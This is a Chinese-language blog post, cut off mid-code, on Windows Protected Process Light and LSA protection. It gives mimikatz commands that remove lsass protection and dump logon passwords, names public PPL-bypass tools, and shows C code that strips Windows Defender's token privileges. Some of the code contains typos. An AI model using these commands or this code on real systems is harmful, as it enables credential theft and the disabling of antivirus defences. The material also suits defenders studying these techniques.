<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="PPL  Windows Vista &#x2F; Server 2008引入 了受保护进程的概念，其目的不是保护您的数据或凭据。其最初目标是保护媒体内容并符合DRM （数字版权管理）要求。Microsoft开发了此机制，以便您的媒体播放器可以读取例如蓝光，同时 防止您复制其内容。当时的要求是映像文件（即可执行文件）必须使用特殊的Windows Media证 书进行数字签名（如Windows In">
<meta property="og:type" content="article">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/PPL%20Attack/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="PPL  Windows Vista &#x2F; Server 2008引入 了受保护进程的概念，其目的不是保护您的数据或凭据。其最初目标是保护媒体内容并符合DRM （数字版权管理）要求。Microsoft开发了此机制，以便您的媒体播放器可以读取例如蓝光，同时 防止您复制其内容。当时的要求是映像文件（即可执行文件）必须使用特殊的Windows Media证 书进行数字签名（如Windows In">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004090544285.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004095314442.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004095344282.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004095404405.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004101600573.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004102810423.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004103239039.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004103549717.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004104126564.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004104636136.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004105011169.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004105359518.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004115143884.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004164708372.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004164756434.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004193232650.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004203921715.png">
<meta property="og:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004204949424.png">
<meta property="article:published_time" content="2024-10-08T03:50:54.556Z">
<meta property="article:modified_time" content="2024-10-04T13:17:47.725Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004090544285.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-免杀/PPL Attack" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/PPL%20Attack/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.556Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="PPL"><a href="#PPL" class="headerlink" title="PPL"></a>PPL</h1><p>  Windows Vista &#x2F; Server 2008引入 了受保护进程的概念，其目的不是保护您的数据或凭据。其最初目标是保护媒体内容并符合DRM （数字版权管理）要求。Microsoft开发了此机制，以便您的媒体播放器可以读取例如蓝光，同时 防止您复制其内容。当时的要求是映像文件（即可执行文件）必须使用特殊的Windows Media证 书进行数字签名（如Windows Internals的“受保护的过程”部分所述）。</p>
<p>  在实践中，<strong>一个受保护的过程可通过未保护的过程仅具有非常有限的权限访问</strong>： PROCESS_QUERY_LIMITED_INFORMATION ， PROCESS_SET_LIMITED_INFORMATION ， PROCESS_TERMINATE 和 PROCESS_SUSPEND_RESUME 。对于某些高度敏感的过程，甚至可以减少 此设置。</p>
<p>  从Windows 8.1 &#x2F; Server 2012 R2开始，Microsoft引入了Protected Process Light的概 念。PPL实际上是对先前“受保护过程”模型的扩展，并添加了“保护级别”的概念，这基本上意味着 某些PP（L）进程可以比其他进程受到更多保护</p>
<p>进程保护的级别是会被添加到EPROCESS的内核结构中，并且具体存储再其Protection成员中。该protection成员是一个PS_PROTECTION结构</p>
<p>这个_PS_PROTECTION 结构如下，前3位代表保护 Type ，它定义过程是 PP 还是 PPL ，后4位代表 Signer 类 型，即实际的保护类型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PS_PROTECTION</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">UCHAR Level;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">UCHAR Type : <span class="number">3</span>;</span><br><span class="line">UCHAR Audit : <span class="number">1</span>; <span class="comment">// Reserved</span></span><br><span class="line">UCHAR Signer : <span class="number">4</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125; PS_PROTECTION, *PPS_PROTECTION;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对于这个结构来说，前3位代表保护 Type ，它定义过程是 PP 还是 PPL ，后4位代表 Signer 类 型，即实际的保护类型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">PS_PROTECTED_TYPE</span> &#123;</span></span><br><span class="line">	PsProtectedTypeNone = <span class="number">0</span>,</span><br><span class="line">	PsProtectedTypeProtectedLight = <span class="number">1</span>,</span><br><span class="line">	PsProtectedTypeProtected = <span class="number">2</span></span><br><span class="line">&#125; PS_PROTECTED_TYPE, *PPS_PROTECTED_TYPE;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">PS_PROTECTED_SIGNER</span> &#123;</span></span><br><span class="line">	PsProtectedSignerNone = <span class="number">0</span>, <span class="comment">// 0</span></span><br><span class="line">	PsProtectedSignerAuthenticode, <span class="comment">// 1</span></span><br><span class="line">	PsProtectedSignerCodeGen, <span class="comment">// 2</span></span><br><span class="line">	PsProtectedSignerAntimalware, <span class="comment">// 3</span></span><br><span class="line">	PsProtectedSignerLsa, <span class="comment">// 4</span></span><br><span class="line">	PsProtectedSignerWindows, <span class="comment">// 5</span></span><br><span class="line">	PsProtectedSignerWinTcb, <span class="comment">// 6</span></span><br><span class="line">	PsProtectedSignerWinSystem, <span class="comment">// 7</span></span><br><span class="line">	PsProtectedSignerApp, <span class="comment">// 8</span></span><br><span class="line">	PsProtectedSignerMax <span class="comment">// 9</span></span><br><span class="line">&#125; PS_PROTECTED_SIGNER, *PPS_PROTECTED_SIGNER;</span><br></pre></td></tr></table></figure>

<p>进程的保护级别就通过上面这两个值的组和来定义</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004090544285.png" alt="image-20241004090544285"></p>
<p>由此，借助API ZwQueryInformationProcess 我们就可以判断进程的PPL保护等级</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">FindProcessProtect</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	PS_PROTECTION ProtectInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	NTSTATUS ntStatus = ZwQueryInformationProcess(NtCurrentProcess(),</span><br><span class="line">	ProcessProtectionInformation, &amp;ProtectInfo, <span class="keyword">sizeof</span>(ProtectInfo), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="type">bool</span> = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">bool</span> Result2 = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span> (NT_SUCCESS(ntStatus))</span><br><span class="line">	&#123;</span><br><span class="line">		Result1 = ProtectInfo.Type == PsProtectedTypeNone &amp;&amp; ProtectInfo.Signer == PsProtectedSignerNone;</span><br><span class="line">		PROCESS_EXTENDED_BASIC_INFORMATION ProcessExtenedInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		ntStatus = ZwQueryInformationProcess(NtCurrentProcess(),</span><br><span class="line">		ProcessBasicInformation, &amp;ProcessExtenedInfo, <span class="keyword">sizeof</span>(ProcessExtenedInfo), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (NT_SUCCESS(ntStatus))</span><br><span class="line">	&#123;</span><br><span class="line">        Result2 = ProcessExtenedInfo.IsProtectedProcess == <span class="literal">false</span> &amp;&amp;</span><br><span class="line">		ProcessExtenedInfo.IsSecureProcess == <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Result2 &amp;&amp; Result1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>Pr.</th>
<th>Process</th>
<th>Type</th>
<th>Signer</th>
<th>Level</th>
</tr>
</thead>
<tbody><tr>
<td><strong>1</strong></td>
<td>wininit.exe</td>
<td>Protected Light</td>
<td>WinTcb</td>
<td>PsProtectedSignerWinTcb-Light</td>
</tr>
<tr>
<td><strong>2</strong></td>
<td>svchost.exe</td>
<td>Protected Light</td>
<td>Lsa</td>
<td>PsProtectedSignerWindows-Light</td>
</tr>
<tr>
<td><strong>3</strong></td>
<td>MsMpEng.exe</td>
<td>Protected Light</td>
<td>Antimalware</td>
<td>PsProtectedSignerAntimalwareLight</td>
</tr>
</tbody></table>
<p>上面的表中我们可以看见，PPL内部也是分级的</p>
<p>wininit.exe signer为WinTcb，它是 PPL 的最高可能值，那么它可以访问其他两个进程，然后， svchost.exe可以访问MsMpEng.exe，因为signer级别Lsa高于Antimalware，最后，MsMpEng.exe不 能访问其他两个进程，因为它具有最低级别，不能访问其他两个进程，因为它具有最低级别。</p>
<p>我们也可以去</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004095314442.png" alt="image-20241004095314442"></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004095344282.png" alt="image-20241004095344282"></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004095404405.png" alt="image-20241004095404405"></p>
<h2 id="LSA"><a href="#LSA" class="headerlink" title="LSA"></a>LSA</h2><p>LSA 即 RunAsPPL ，虽然 lsass 进程有 PPL ，微软为了防止非管理非 PPL 进程通过开放访问或篡改 PPL 进程中的代码和数据推出了 LSA ，但是在一般情况下是并没有启用的，有可能是防御方通过注册表打开了PPL，或者是EDR开了</p>
<p>这里我以我的win10虚拟机为例，可以看见这个lsass.exe进程是没有开启PPL保护的</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004101600573.png" alt="image-20241004101600573"></p>
<p>这时候我们使用mimikaz，密码是可以正常抓到的</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004102810423.png" alt="image-20241004102810423"></p>
<p>手动开启LSA的方法是，找到注册表里面的HKLM\SYSTEM\CurrentControlSet\Control\Lsa 然后添加一个 DWORD 值 RunAsPPL ，并把值从0改为1即可，之后重启电脑</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004103239039.png" alt="image-20241004103239039"></p>
<p>这时候我们再次打开Processmonitor，可以看见PPL已经被加上了</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004103549717.png" alt="image-20241004103549717"></p>
<p>这时候我们再去使用mimikaz抓密码，很明显，不行</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004104126564.png" alt="image-20241004104126564"></p>
<p>我们可以去gitee上找到mimikaz的源码，看看是怎么定义这个错误的</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004104636136.png" alt="image-20241004104636136"></p>
<p>可以看见这里也是使用OpenProcess来打开进程获得句柄，我们当然知道，这里低权限进程是没有办法打开高权限进程的</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004105011169.png" alt="image-20241004105011169"></p>
<p>之后if分支判断如果是INVALID_HANDLE_VALUE那么进入else分支，通过GetLastError把错误码打印出来，也就是我们看见的0x000005</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004105359518.png" alt="image-20241004105359518"></p>
<h2 id="mimdrv-sys"><a href="#mimdrv-sys" class="headerlink" title="mimdrv.sys"></a>mimdrv.sys</h2><p>mimikaz里面提供了mimidrv.sys来绕过，在加载之后就可以关闭LSA保护</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">!+</span><br><span class="line">!procoessprotect /process:lsass.exe /remove</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p>不过直到我复现的2024.10这个时间节点，这个驱动的证书已经被吊销</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004115143884.png" alt="image-20241004115143884"></p>
<h2 id="PPL-Fault"><a href="#PPL-Fault" class="headerlink" title="PPL Fault"></a>PPL Fault</h2><p>这里搬一个2023年4月份的项目，主要PPL Killer实在太老，一般这些PPL绕过的工具在公开了之后，很快就会被相关安全人员写入规则</p>
<p><a target="_blank" rel="noopener" href="https://github.com/gabriellandau/PPLFault">gabriellandau&#x2F;PPLFault (github.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">By Gabriel Landau at Elastic Security.</span><br><span class="line"></span><br><span class="line">From PPLdump Is Dead. Long Live PPLdump! presented at Black Hat Asia 2023.</span><br></pre></td></tr></table></figure>

<p>虽然现在应该是用不了了（正常打补丁的win），但是思路还是可以说一下</p>
<p>也是通过把WinTCb的ppl拿到，然后通过高权限（只要比Lsa高就行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Acquired exclusive oplock to file: C:\Windows\System32\devobj.dll</span><br><span class="line"> [+] Ready.  Spawning WinTcb.</span><br><span class="line"> [+] SpawnPPL: Waiting for child process to finish.</span><br></pre></td></tr></table></figure>

<h2 id="PPL-medic"><a href="#PPL-medic" class="headerlink" title="PPL medic"></a>PPL medic</h2><p><a target="_blank" rel="noopener" href="https://github.com/itm4n/PPLmedic">https://github.com/itm4n/PPLmedic</a></p>
<p>也是一个公开的项目，应该也是被杀软标记了</p>
<h3 id="摘除Windows-defender的令牌"><a href="#摘除Windows-defender的令牌" class="headerlink" title="摘除Windows defender的令牌"></a>摘除Windows defender的令牌</h3><p><strong>这里要提一点，在Win Pc的版本中对Win Defender有补丁，所以测试环境移到Win Server 2019上进行</strong></p>
<p>通过Process Hacker查看WIndows Defender的令牌，我们可以看见如下</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004164708372.png" alt="image-20241004164708372"></p>
<p>我们可以看见Win Defender以System权限启动</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004164756434.png" alt="image-20241004164756434"></p>
<p>SYSTEM 用户可以完全控制令牌，这意味着，除非有其他机制保护令牌，否则以 SYSTEM 身份运行的线 程可以修改令牌，但是在windows中并没有保护令牌的机制，在 Process Hacker中 我们可以看到定义 的完整性为6种</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Untrusted – processes that are logged on anonymously are automatically designated</span><br><span class="line">as Untrusted</span><br><span class="line">    </span><br><span class="line">Low – The Low integrity level is the level used by <span class="keyword">default</span> <span class="keyword">for</span> interaction with the</span><br><span class="line">Internet. As <span class="type">long</span> as Internet Explorer is run in its <span class="keyword">default</span> state, Protected Mode, all files</span><br><span class="line">and processes associated with it are assigned the Low integrity level. Some folders,</span><br><span class="line">such as the Temporary Internet Folder, are also assigned the Low integrity level by</span><br><span class="line"><span class="keyword">default</span>.</span><br><span class="line">    </span><br><span class="line">Medium – Medium is the context that most objects will run in. Standard users receive</span><br><span class="line">the Medium integrity level, and any object not explicitly designated with a lower or</span><br><span class="line">higher integrity level is Medium by <span class="keyword">default</span>.</span><br><span class="line">    </span><br><span class="line">High – Administrators are granted the High integrity level. This ensures that</span><br><span class="line">Administrators are capable of interacting with and modifying objects assigned Medium</span><br><span class="line">or Low integrity levels, but can also act on other objects with a High integrity level,</span><br><span class="line">which standard users can not <span class="keyword">do</span>.</span><br><span class="line">    </span><br><span class="line">System – As the name implies, the System integrity level is reserved <span class="keyword">for</span> the system.</span><br><span class="line">The Windows kernel and core services are granted the System integrity level. Being</span><br><span class="line">even higher than the High integrity level of Administrators protects these core</span><br><span class="line">functions from being affected or compromised even by Administrators.</span><br><span class="line">    </span><br><span class="line">Installer – The Installer integrity level is a special <span class="keyword">case</span> and is the highest of all integrity</span><br><span class="line">levels. By virtue of being equal to or higher than all other WIC integrity levels, objects</span><br><span class="line">assigned the Installer integrity level are also able to uninstall all other objects.</span><br></pre></td></tr></table></figure>

<p>一般匿名登录的进程被自动指定为Untrusted</p>
<p>比如我们的浏览器，它在系统上执行一些特权操作时，实际上都不是浏览器本身执行，而是代理给到了其他非沙盒的进程来代表它来执行操作。如果在这种情况下沙盒进程被利用，那么其他它造成的损害就会比较有限，比如我们下载到了一些恶意软件，会很快被识别出来并被Win Defender隔离</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241004193232650.png" alt="image-20241004193232650"></p>
<p>简而言之，Untrusted的进程对计算机的操作非常有限</p>
<p><strong>所以我们可以换一个思路，不一定要提升我们恶意软件的进程，也可以降低这些杀软的进程等级</strong></p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p><strong>核心函数</strong>（微软是给了demo的，但是要稍微改一下，名字叫做在 <strong>C++ 中启用和禁用特权</strong>）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">SetPricilege</span><span class="params">(</span></span><br><span class="line"><span class="params">	HANDLE hToken,</span></span><br><span class="line"><span class="params">	LPCTSTR lpszPrivilege,</span></span><br><span class="line"><span class="params">	BOOL bEnablePrivilege</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	TOKEN_PRIVILEGES tp;</span><br><span class="line">	LUID luid;</span><br><span class="line">    <span class="comment">//检索本地唯一标识符</span></span><br><span class="line">	<span class="keyword">if</span>(!LookupPrivilegeValue(</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		lpszPrivilege,</span><br><span class="line">      	&amp;luid</span><br><span class="line">	))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LookupPricilegeValue Error:%d\n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span>(bEnablePrivilege)<span class="comment">//无论是否有bEnable标志，我们都设置特权标志为SE_PRIVILEGE_REMOVED，方便我们待会换掉原进程的令牌</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_REMOVED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_REMOVED;</span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(</span><br><span class="line">        hToken,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;tp,</span><br><span class="line">        <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">        (PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">        (PDWORD)<span class="literal">NULL</span></span><br><span class="line">    ))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges Error:%d\n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果失败返回FALSE</span></span><br><span class="line">    <span class="keyword">if</span>(GetLastError() == ERROR_NOT_ALL_ASSIGNED)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The token does not have the specified privilege\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面用到的结构和函数，我也是边看边学</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TOKEN_PRIVILEGES</span> &#123;</span></span><br><span class="line">  DWORD               PrivilegeCount;</span><br><span class="line">  LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];</span><br><span class="line">&#125; TOKEN_PRIVILEGES, *PTOKEN_PRIVILEGES;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">AdjustTokenPrivileges</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]            HANDLE            TokenHandle,<span class="comment">//包含要修改的权限的访问令牌的句柄。 句柄必须具有TOKEN_ADJUST_PRIVILEGES令牌的访问权限</span></span></span><br><span class="line"><span class="params">  [in]            BOOL              DisableAllPrivileges,</span></span><br><span class="line"><span class="params">  [in, optional]  PTOKEN_PRIVILEGES NewState,<span class="comment">//指向 TOKEN_PRIVILEGES 结构的指针</span></span></span><br><span class="line"><span class="params">  [in]            DWORD             BufferLength,<span class="comment">//结构大小</span></span></span><br><span class="line"><span class="params">  [out, optional] PTOKEN_PRIVILEGES PreviousState,</span></span><br><span class="line"><span class="params">  [out, optional] PDWORD            ReturnLength</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>Return code</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ERROR_SUCCESS</strong></td>
<td>函数调整了所有指定的特权</td>
</tr>
<tr>
<td><strong>ERROR_NOT_ALL_ASSIGNED</strong></td>
<td>令牌不具有<em>NewState</em>参数中指定的一个或多个权限。即使没有调整特权，函数也可能成功执行此错误值。<em>PreviousState</em>参数指示已调整的权限。</td>
</tr>
</tbody></table>
<p>提权函数，启用当前进程的SE_DEBUG_NAME 权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">EnableDebugPrivilege</span><span class="params">()</span>&#123;</span><br><span class="line">	HANDLE hToken;</span><br><span class="line">	LUID sedebugnameValue;</span><br><span class="line">	TOKEN_PRIVILEGES tkp;</span><br><span class="line">	<span class="keyword">if</span>(!OpenProcessToken(GetCurrentProcess(),TOEKN_ADJUST_PRIVILEGES | TOKEN_QUERY,&amp;hToken))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcessTokenError:%d\n&quot;</span>,GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!LookupPrivilegeValue(<span class="literal">NULL</span>,SE_DEBUG_NAME,&amp;sedebugnameValue))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue Error:%d\n&quot;</span>,GetLastError());</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tkp,Privileges[<span class="number">0</span>].Luid = sedebugnameValue;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">if</span>(!AdjustTokenPrivileges(hToken,FALSE,&amp;tkp,<span class="keyword">sizeof</span>(tkp),<span class="literal">NULL</span>,<span class="literal">NULL</span>))&#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        